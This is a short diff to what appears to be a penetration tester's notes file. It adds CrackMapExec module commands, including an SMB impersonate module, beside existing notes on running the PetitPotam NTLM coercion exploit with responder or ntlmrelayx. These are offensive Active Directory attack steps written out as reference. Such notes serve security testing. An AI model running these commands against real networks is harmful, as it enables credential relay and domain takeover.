@@ -48,6 +48,9 @@
 
 
 #Explolits
+	cme module -L 
+	cme module -M --options
+		cme smb -M impersonate --options
 	petitpotam
 		https://github.com/topotam/PetitPotam?ref=blog.zsec.uk
 	(start responder/ntlmrelayx) python3 petitpotam.py listen-ip target-ip
